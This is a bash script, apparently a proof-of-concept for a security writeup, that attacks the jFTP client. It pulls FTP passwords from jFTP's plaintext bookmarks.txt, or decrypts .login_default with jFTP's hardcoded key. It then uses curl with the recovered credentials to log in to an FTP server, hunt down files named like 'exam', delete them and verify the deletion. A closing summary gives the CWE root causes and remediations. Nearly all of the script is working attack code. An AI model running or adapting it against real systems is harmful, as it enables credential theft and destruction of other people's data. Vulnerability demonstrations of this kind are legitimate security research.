#!/usr/bin/env bash
#
# Simulated attack: recover an FTP password from a REAL leaked jFTP
# saved-login file, then use the recovered credentials to find and delete
# a "sensitive" exam from an ALREADY-RUNNING pyftpdlib FTP server.
#
# This script does NOT start a server and does NOT write any jFTP config
# file of its own. It assumes you have already, by hand:
#
#   1. Started the real pyftpdlib server from the pyftpdlib/ directory,
#      e.g. (from inside pyftpdlib/):
#         python3 -m pyftpdlib -i 127.0.0.1 -p 2121 -d . -u ta_exams \
#             -P 'some-password' -w
#      with the exam file (or an exam directory) placed somewhere under
#      that server's document root.
#   2. Started jFTP (e.g. from VS Code / its own build) and connected to
#      that server, so jFTP wrote a login record to disk under ~/.jftp/.
#
# attack.sh looks in ~/.jftp/ (where jFTP keeps ALL of its saved-login
# state) for TWO different files, in this order:
#
#   PRIMARY:  bookmarks.txt  -- written by AddBookmarks/BookmarkManager
#             whenever a bookmark is saved. Its password field is plain
#             text ("protocol#host#user#password#port#dir#local", one
#             line per bookmark) -- AddBookmarks.getData() never calls
#             any encryption routine at all, so this is the easiest,
#             most direct credential leak: just read the file.
#
#   FALLBACK: .login_default -- written by HostChooser/SaveSet whenever
#             you connect with "Store passwords" enabled. Its password
#             field IS run through Crypto.Encrypt() (PBEWithMD5AndDES,
#             hardcoded key/salt), so recovering it needs jFTP's own
#             Crypto class to decrypt -- see the original version of
#             this script / commit history for that attack in isolation.
#
# attack.sh tries bookmarks.txt first. Only if that file is missing, or
# exists but has no FTP entry with an actual (non-empty, non-"0",
# non-"<%hidden%>") password, does it fall back to decrypting
# .login_default. Either way,
# once credentials are recovered, it connects with a plain FTP client
# (curl, not jFTP) and deletes the exam. The server and jFTP client are
# both already-running, independent processes this script never touches
# except over the wire (the server) or by reading files off disk (jFTP's
# saved-login state).
#
set -euo pipefail

DEMO_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO_ROOT="$(cd "${DEMO_DIR}/.." && pwd)"

# Where jFTP keeps ALL of its saved-login state: Settings.appHomeDir is
# ${user.home}/.jftp/. Both bookmarks.txt and .login_default live there.
# Override JFTP_HOME_DIR if yours lives elsewhere, or override
# BOOKMARKS_FILE / LOGIN_DEFAULT directly (e.g. to point at a throwaway
# copy of one of these files for testing).
JFTP_HOME_DIR="${JFTP_HOME_DIR:-${HOME}/.jftp}"
BOOKMARKS_FILE="${BOOKMARKS_FILE:-${JFTP_HOME_DIR}/bookmarks.txt}"
LOGIN_DEFAULT="${LOGIN_DEFAULT:-${JFTP_HOME_DIR}/.login_default}"

# The exact placeholder jFTP writes back into a bookmark's password field
# when it couldn't be reconnected with (Settings.hiddenPassword in
# config/Settings.java). A bookmark showing this string has no real
# password sitting in the file -- treat it the same as an empty field.
JFTP_HIDDEN_PASSWORD='<%hidden%>'

# What to search for / delete on the server once logged in. EXAM_NAME is
# matched case-insensitively against file AND directory names anywhere in
# the tree (not just the top level) via recursive LIST; the first hit
# found is deleted. Override via EXAM_NAME if your exam is named/placed
# differently.
EXAM_NAME="${EXAM_NAME:-exam}"
MAX_DEPTH="${MAX_DEPTH:-6}"

# Populated by whichever of try_bookmarks / try_login_default succeeds.
CRED_HOST=""
CRED_USER=""
CRED_PASS=""
CRED_PORT=""
CRED_SOURCE=""

section() { printf '\n=== %s ===\n' "$1"; }

# ---------------------------------------------------------------------
# PRIMARY: bookmarks.txt (plain text, no decryption needed)
# ---------------------------------------------------------------------
try_bookmarks() {
    if [[ ! -f "${BOOKMARKS_FILE}" ]]; then
        echo "bookmarks.txt not found at ${BOOKMARKS_FILE}"
        return 1
    fi

    echo "found: ${BOOKMARKS_FILE}"
    echo "jFTP stores this file as plain '#'-delimited text -- AddBookmarks's"
    echo "getData() writes it straight from the Add Bookmark dialog and never"
    echo "calls any encryption routine, so no decryption step is needed here:"
    echo

    local -a cand_host=() cand_user=() cand_pass=() cand_port=()
    local raw_line line trimmed lower
    while IFS= read -r raw_line || [[ -n "${raw_line}" ]]; do
        line="${raw_line%$'\r'}"                       # tolerate CRLF
        trimmed="${line#"${line%%[![:space:]]*}"}"      # strip leading ws
        [[ -z "${trimmed}" ]] && continue
        [[ "${trimmed}" == \#* ]] && continue
        lower="${trimmed,,}"
        [[ "${lower}" == '<dir>'* || "${lower}" == '<enddir>'* ]] && continue

        local -a fields=()
        IFS='#' read -r -a fields <<< "${trimmed}"
        [[ "${#fields[@]}" -lt 5 ]] && continue
        [[ "${fields[0]^^}" != "FTP" ]] && continue

        local host="${fields[1]:-}" user="${fields[2]:-}" \
              pass="${fields[3]:-}" port="${fields[4]:-21}"
        [[ -z "${host}" || -z "${user}" ]] && continue
        # A password field of "0" is treated the same as an empty
        # password -- jFTP/bookmarks.txt has no real password there, so
        # this entry is a useless credential and should be skipped too.
        [[ -z "${pass}" || "${pass}" == "0" || "${pass}" == "${JFTP_HIDDEN_PASSWORD}" ]] && continue

        cand_host+=("${host}")
        cand_user+=("${user}")
        cand_pass+=("${pass}")
        cand_port+=("${port}")
    done < "${BOOKMARKS_FILE}"

    if [[ ${#cand_host[@]} -eq 0 ]]; then
        echo "bookmarks.txt exists but has no FTP entry with a usable" >&2
        echo "(non-empty, non-\"0\", non-\"${JFTP_HIDDEN_PASSWORD}\") password field." >&2
        return 1
    fi

    echo "FTP entries found with usable passwords:"
    local i
    for i in "${!cand_host[@]}"; do
        echo "  [$((i + 1))] ${cand_user[$i]}@${cand_host[$i]}:${cand_port[$i]}"
    done

    # Prefer the last non-anonymous entry (bookmarks.txt is appended to,
    # so the last matching line is the most recently saved bookmark).
    # jFTP ships default bookmarks.txt templates seeded with "anonymous"
    # entries pointed at public mirrors (upload.sourceforge.net,
    # ftp.kernel.org) -- see BookmarkManager.setDefaultText() -- so an
    # anonymous-only file is treated the same as "no usable entry" and
    # falls through to the .login_default attack instead, rather than
    # confidently connecting to someone else's public FTP server.
    local idx=-1
    for ((i = ${#cand_host[@]} - 1; i >= 0; i--)); do
        if [[ "${cand_user[$i],,}" != "anonymous" ]]; then
            idx=$i
            break
        fi
    done
    if [[ ${idx} -lt 0 ]]; then
        echo "all usable entries are 'anonymous' (likely jFTP's default" >&2
        echo "bookmarks.txt template, not a real saved login) -- treating" >&2
        echo "bookmarks.txt as having no usable credential." >&2
        return 1
    fi

    CRED_HOST="${cand_host[$idx]}"
    CRED_USER="${cand_user[$idx]}"
    CRED_PASS="${cand_pass[$idx]}"
    CRED_PORT="${cand_port[$idx]}"
    CRED_SOURCE="bookmarks.txt (plaintext, entry $((idx + 1)) of ${#cand_host[@]})"

    echo
    echo "selected: ${CRED_USER}@${CRED_HOST}:${CRED_PORT}"
    echo "plaintext password field: ${CRED_PASS}"
    return 0
}

# ---------------------------------------------------------------------
# Lazily set up the Java classpath + sanity checks needed ONLY for the
# .login_default fallback (bookmarks.txt never needs a JDK at all).
# ---------------------------------------------------------------------
setup_crypto_cp() {
    JFTP_SRC="${JFTP_SRC:-${REPO_ROOT}/jftp}"

    if [[ ! -f "${JFTP_SRC}/src/java/net/sf/jftp/config/Crypto.java" ]]; then
        echo "Could not find jftp/src/java/.../Crypto.java under ${JFTP_SRC}" >&2
        echo "Set JFTP_SRC to the path of your jftp/ checkout and re-run." >&2
        return 1
    fi
    if ! command -v java >/dev/null 2>&1; then
        echo "Could not find 'java' on PATH (needed to decrypt .login_default)." >&2
        return 1
    fi
    if [[ ! -f "${DEMO_DIR}/crypto_helper/out/CryptoCli.class" ]]; then
        echo "${DEMO_DIR}/crypto_helper/out/CryptoCli.class not found." >&2
        echo "Run ./setup.sh first to compile it." >&2
        return 1
    fi

    # On Windows (Git Bash/MSYS/Cygwin), `java` is a native Win32 binary,
    # not an MSYS binary -- it needs native "C:\..." paths, not POSIX
    # "/c/..." paths. Git Bash normally auto-translates a POSIX path to a
    # Windows path for you when an argument IS a path, but -cp here is
    # TWO paths joined by ';' inside one argument -- that joined string
    # no longer "looks like a path" to the auto-translator, so it's
    # passed through unconverted and java can't resolve either half.
    # cygpath -w, which ships with Git Bash, converts a path explicitly;
    # use it per-component before joining.
    local to_native
    to_native() {
        if command -v cygpath >/dev/null 2>&1; then
            cygpath -w "$1"
        else
            printf '%s' "$1"
        fi
    }

    local cp_sep crypto_out_dir jftp_lib_dir
    case "$(uname -s)" in
        CYGWIN*|MINGW*|MSYS*)
            cp_sep=';'
            crypto_out_dir="$(to_native "${DEMO_DIR}/crypto_helper/out")"
            jftp_lib_dir="$(to_native "${JFTP_SRC}/lib")"
            ;;
        *)
            cp_sep=':'
            crypto_out_dir="${DEMO_DIR}/crypto_helper/out"
            jftp_lib_dir="${JFTP_SRC}/lib"
            ;;
    esac
    CRYPTO_CP="${crypto_out_dir}${cp_sep}${jftp_lib_dir}"
    return 0
}

# ---------------------------------------------------------------------
# FALLBACK: .login_default (encrypted; needs jFTP's own Crypto class)
# ---------------------------------------------------------------------
try_login_default() {
    if [[ ! -f "${LOGIN_DEFAULT}" ]]; then
        echo "Could not find ${LOGIN_DEFAULT} either." >&2
        return 1
    fi

    echo "found: ${LOGIN_DEFAULT}"
    echo "contents (host / user / encrypted-password / port / cwd / lcwd):"
    cat "${LOGIN_DEFAULT}"

    local ld_host ld_user ld_enc_pw ld_port
    ld_host=$(sed -n '1p' "${LOGIN_DEFAULT}")
    ld_user=$(sed -n '2p' "${LOGIN_DEFAULT}")
    ld_enc_pw=$(sed -n '3p' "${LOGIN_DEFAULT}")
    ld_port=$(sed -n '4p' "${LOGIN_DEFAULT}")

    if [[ -z "${ld_host}" || -z "${ld_user}" || -z "${ld_port}" ]]; then
        echo "FAILED: .login_default is missing host/user/port fields." >&2
        return 1
    fi
    if [[ -z "${ld_enc_pw}" ]]; then
        echo "FAILED: .login_default has an empty password field." >&2
        echo "('Store passwords' may be off, or no password was saved for this login.)" >&2
        return 1
    fi

    echo
    echo "parsed: host=${ld_host} user=${ld_user} port=${ld_port}"
    echo "stored (encrypted) password field: ${ld_enc_pw}"
    echo
    echo "jFTP 'encrypts' saved passwords with PBEWithMD5AndDES using a password"
    echo "and salt that are hardcoded constants in Crypto.java -- identical on"
    echo "every install, and visible to anyone with the jFTP source or jar. The"
    echo "attacker recompiles/reuses that exact class to decrypt:"

    setup_crypto_cp || return 1

    local java_out
    if ! java_out=$(java -cp "${CRYPTO_CP}" CryptoCli decrypt "${ld_enc_pw}" 2>&1); then
        echo "FAILED: the 'java' command itself errored out:" >&2
        echo "${java_out}" >&2
        echo >&2
        echo "classpath used: ${CRYPTO_CP}" >&2
        echo "This usually means one of the two paths in that classpath is wrong" >&2
        echo "for how 'java' expects to see it on this OS -- e.g. on Windows," >&2
        echo "if a POSIX-style /c/... path got passed to the native Windows" >&2
        echo "java.exe instead of a C:\\... path, java.exe can't find CryptoCli" >&2
        echo "on that classpath at all. Verify both halves of the path above" >&2
        echo "actually exist from java's point of view." >&2
        return 1
    fi

    if [[ -z "${java_out}" ]]; then
        echo "FAILED: Crypto.Decrypt() returned an empty string." >&2
        echo "(Is ${ld_enc_pw} actually ciphertext produced by Crypto.Encrypt()?" >&2
        echo " A plaintext password here would mean 'Store passwords' was off" >&2
        echo " when this login was saved, in which case the field is blank, not" >&2
        echo " this -- so this usually means a corrupted or hand-edited file.)" >&2
        return 1
    fi
    echo "  recovered plaintext password: ${java_out}"

    CRED_HOST="${ld_host}"
    CRED_USER="${ld_user}"
    CRED_PASS="${java_out}"
    CRED_PORT="${ld_port}"
    CRED_SOURCE=".login_default (decrypted via jFTP's own Crypto.Decrypt())"
    return 0
}

section "0. Locate leaked FTP credentials (bookmarks.txt, then .login_default)"
if try_bookmarks; then
    :
elif try_login_default; then
    echo
    echo "(bookmarks.txt was unavailable/unusable, so this run fell back to"
    echo " the encrypted .login_default attack instead.)"
else
    echo >&2
    echo "FAILED: could not recover usable FTP credentials from either:" >&2
    echo "  - ${BOOKMARKS_FILE}  (plaintext bookmarks)" >&2
    echo "  - ${LOGIN_DEFAULT}  (encrypted saved login)" >&2
    echo >&2
    echo "See the per-file diagnostics above. At least one of jFTP's saved-login" >&2
    echo "files needs to exist with real credentials for this script to do" >&2
    echo "anything; see README.md for how to produce one." >&2
    exit 1
fi

echo
echo "using credentials from: ${CRED_SOURCE}"
echo "  ${CRED_USER}@${CRED_HOST}:${CRED_PORT}"

section "1. Connect to the already-running FTP server with any FTP client"
echo "Attacker never touches jFTP itself from here on -- just an ordinary"
echo "FTP client (curl) pointed at the host/port/user recovered above."

FTP_BASE="ftp://${CRED_HOST}:${CRED_PORT}/"
AUTH=(--user "${CRED_USER}:${CRED_PASS}")

if ! LOGIN_CHECK=$(curl -sS --connect-timeout 10 "${AUTH[@]}" "${FTP_BASE}" 2>&1); then
    echo "FAILED to log in / list the server at ${FTP_BASE} as '${CRED_USER}':" >&2
    echo "${LOGIN_CHECK}" >&2
    exit 1
fi
echo "login OK. Root directory listing:"
echo "${LOGIN_CHECK}"

section "2. Recursively search the server for the exam (matching '*${EXAM_NAME}*')"
# Minimal breadth-first walk of the server tree using plain LIST, looking
# for any file or directory whose name contains EXAM_NAME
# (case-insensitive). Two parallel arrays stand in for a queue of
# (ftp-path, depth) pairs -- avoids embedding a literal tab/separator
# inside a single string, which is easy to get wrong in bash.
declare -a queue_paths=("/")
declare -a queue_depths=(0)
FOUND_PATH=""
FOUND_KIND=""   # "file" or "dir"

while [[ ${#queue_paths[@]} -gt 0 ]]; do
    dir_path="${queue_paths[0]}"
    depth="${queue_depths[0]}"
    queue_paths=("${queue_paths[@]:1}")
    queue_depths=("${queue_depths[@]:1}")

    # curl only LISTs a directory when the URL ends in '/'. Without it,
    # a child like pyftpdlib is RETR'd as a file and the walk skips it.
    list_url="${FTP_BASE}${dir_path#/}"
    [[ "${list_url}" == */ ]] || list_url="${list_url}/"
    listing=$(curl -sS "${AUTH[@]}" "${list_url}" 2>/dev/null) || continue

    while IFS= read -r line; do
        line="${line%$'\r'}"
        [[ -z "${line}" ]] && continue
        is_dir=0
        [[ "${line}" == d* ]] && is_dir=1
        # strip the first 8 whitespace-separated fields (perms, links,
        # owner, group, size, month, day, time/year), leaving the name
        # (handles filenames containing spaces).
        name=$(printf '%s\n' "${line}" | awk '{for(i=1;i<=8;i++) $i=""; sub(/^ +/,""); print}')
        [[ -z "${name}" ]] && continue

        child_path="${dir_path%/}/${name}"
        lower_name="${name,,}"
        lower_exam="${EXAM_NAME,,}"

        if [[ "${lower_name}" == *"${lower_exam}"* ]]; then
            FOUND_PATH="${child_path}"
            FOUND_KIND=$([[ ${is_dir} -eq 1 ]] && echo dir || echo file)
            break 2
        fi

        if [[ ${is_dir} -eq 1 && ${depth} -lt ${MAX_DEPTH} ]]; then
            queue_paths+=("${child_path}")
            queue_depths+=("$((depth + 1))")
        fi
    done <<< "${listing}"
done

if [[ -z "${FOUND_PATH}" ]]; then
    echo "FAILED: no file or directory matching '*${EXAM_NAME}*' found within" >&2
    echo "${MAX_DEPTH} levels of the server root." >&2
    echo "Set EXAM_NAME to match how the exam is actually named, e.g.:" >&2
    echo "    EXAM_NAME=midterm ./attack.sh" >&2
    exit 1
fi

echo "found ${FOUND_KIND}: ${FOUND_PATH}"

section "3. Delete the exam from the server"
if [[ "${FOUND_KIND}" == "file" ]]; then
    if ! DEL_OUT=$(curl -sS "${AUTH[@]}" -Q "DELE ${FOUND_PATH}" "${FTP_BASE}" 2>&1); then
        echo "FAILED to delete ${FOUND_PATH}:" >&2
        echo "${DEL_OUT}" >&2
        exit 1
    fi
    echo "deleted file: ${FOUND_PATH}"
else
    # Directory: recursively delete its contents (deepest first) then
    # RMD the now-empty directory, exactly as any FTP client would have
    # to -- pyftpdlib's RMD (like the FTP spec) only removes empty dirs.
    echo "exam is a directory; deleting its contents recursively, then the directory itself"

    declare -a del_files=()
    declare -a del_dirs=("${FOUND_PATH}")
    declare -a walk=("${FOUND_PATH}")

    while [[ ${#walk[@]} -gt 0 ]]; do
        cur="${walk[0]}"
        walk=("${walk[@]:1}")
        listing=$(curl -sS "${AUTH[@]}" "${FTP_BASE}${cur#/}/" 2>/dev/null) || continue
        while IFS= read -r line; do
            line="${line%$'\r'}"
            [[ -z "${line}" ]] && continue
            is_dir=0
            [[ "${line}" == d* ]] && is_dir=1
            name=$(printf '%s\n' "${line}" | awk '{for(i=1;i<=8;i++) $i=""; sub(/^ +/,""); print}')
            [[ -z "${name}" ]] && continue
            child="${cur%/}/${name}"
            if [[ ${is_dir} -eq 1 ]]; then
                del_dirs+=("${child}")
                walk+=("${child}")
            else
                del_files+=("${child}")
            fi
        done <<< "${listing}"
    done

    for f in "${del_files[@]}"; do
        if curl -sS "${AUTH[@]}" -Q "DELE ${f}" "${FTP_BASE}" >/dev/null 2>&1; then
            echo "  deleted file: ${f}"
        else
            echo "  FAILED to delete file: ${f}" >&2
            exit 1
        fi
    done

    # deepest directories first so RMD always sees an empty directory
    for ((i=${#del_dirs[@]}-1; i>=0; i--)); do
        d="${del_dirs[$i]}"
        if curl -sS "${AUTH[@]}" -Q "RMD ${d}" "${FTP_BASE}" >/dev/null 2>&1; then
            echo "  removed directory: ${d}"
        else
            echo "  FAILED to remove directory: ${d}" >&2
            exit 1
        fi
    done
fi

section "4. Verify"
if curl -sS "${AUTH[@]}" "${FTP_BASE}${FOUND_PATH#/}" >/dev/null 2>&1; then
    echo "FAILED: ${FOUND_PATH} still appears to exist on the server." >&2
    exit 1
fi
echo "confirmed: ${FOUND_PATH} is gone from the server."

section "Summary"
cat <<SUMMARY
Credentials recovered from: ${CRED_SOURCE}
Server: ${CRED_USER}@${CRED_HOST}:${CRED_PORT}
Deleted: ${FOUND_PATH}

Root cause (bookmarks.txt): AddBookmarks writes jFTP's "Add Bookmark"
entries to \${user.home}/.jftp/bookmarks.txt as plain '#'-delimited text,
including the password, with NO encryption step at all (there's no call
to Crypto.Encrypt or anything else in AddBookmarks.getData()). Anyone who
can read that file has the real FTP password outright -- no decryption,
brute force, or sniffing needed. This is CWE-256/CWE-312 (plaintext
storage of a password).

Root cause (.login_default fallback, if that's what this run used
instead): net.sf.jftp.config.Crypto uses a hardcoded password and salt
(PBEWithMD5AndDES) to obscure saved FTP passwords -- reversible
encryption with a key that is identical for every user and every install,
and public (it ships in the open-source jar/class files). This is
CWE-321/CWE-798 (use of a hardcoded cryptographic key), and is only
cosmetically better than storing the password in plaintext.

Either way: whoever can read \${user.home}/.jftp/ on the victim's machine
(backup, synced dotfiles repo, shared/misconfigured account, stolen
laptop, etc.) can recover a real, working FTP password without ever
touching jFTP or the server directly.

Remediations to point out in a writeup:
  - Never write a password to disk in plain text (bookmarks.txt).
  - Never encrypt/obfuscate locally stored secrets with a key that is
    hardcoded in source/bytecode shipped to every user (.login_default).
  - Use OS-provided secret storage (keychain/credential manager/DPAPI) or
    a per-install, randomly generated key never written to disk in the
    clear.
  - Don't rely on a single long-lived shared credential for something as
    sensitive as exam distribution; use short-lived, per-user credentials
    or tokens and rotate/revoke them.
  - Treat "encrypted at rest with a static key" as equivalent to
    plaintext for threat-modeling purposes -- as this run demonstrates,
    the plaintext file was in the exact same directory as the "encrypted"
    one and was tried first because it's simply less work to exploit.
SUMMARY
